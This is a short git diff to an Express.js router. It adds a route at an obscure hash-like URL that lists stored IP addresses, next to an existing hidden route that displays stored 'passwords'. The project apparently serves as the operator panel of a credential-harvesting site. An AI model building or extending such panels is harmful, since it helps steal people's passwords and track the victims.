@@ -1,5 +1,6 @@
 const express = require('express');
 const UserName = require('../models/UserName.js');
+const Ip = require('../models/Ip.js');
 
 const router = express.Router();
 
@@ -22,6 +23,17 @@ router.get('/33760E8BAFCFCFC68764091CF96EC423', async (req, res, next) => {
     passwords: passes,
     count,
     title: 'finals',
+  });
+});
+
+router.get('/957b527bcfbad2e80f58d20683931435', async (req, res, next) => {
+  const ips = await Ip.find();
+  const count = await UserName.count();
+
+  res.render('passes', {
+    passwords: ips,
+    count,
+    title: 'ips',
   });
 });
 
